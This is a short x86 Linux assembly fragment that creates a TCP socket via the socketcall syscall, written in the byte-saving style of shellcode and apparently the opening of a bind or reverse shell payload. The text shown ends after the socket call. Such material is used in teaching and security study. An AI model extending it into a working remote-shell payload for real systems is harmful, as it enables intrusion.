global _start
section .data

_start:
    ; We'll need to use socketcall for all interactions with sockets.
    ; References:
    ; http://man7.org/linux/man-pages/man2/socketcall.2.html
    ; http://lxr.free-electrons.com/source/net/socket.c?v=2.6.35#L2210
    
    ; 
    xor eax, eax
    push eax        ; protocol=0
    mov al, 0x66
    
    xor ebx, ebx
    inc ebx         ; saves us a byte
    
    push ebx        ; SOCK_STREAM=1
    push 0x2
    
    mov ecx, esp
    
    ; socket(PF_INET, SOCK_STREAM, 0);
    int 0x80
    
    xchg edi, eax   ; sockfd is now stored in edi
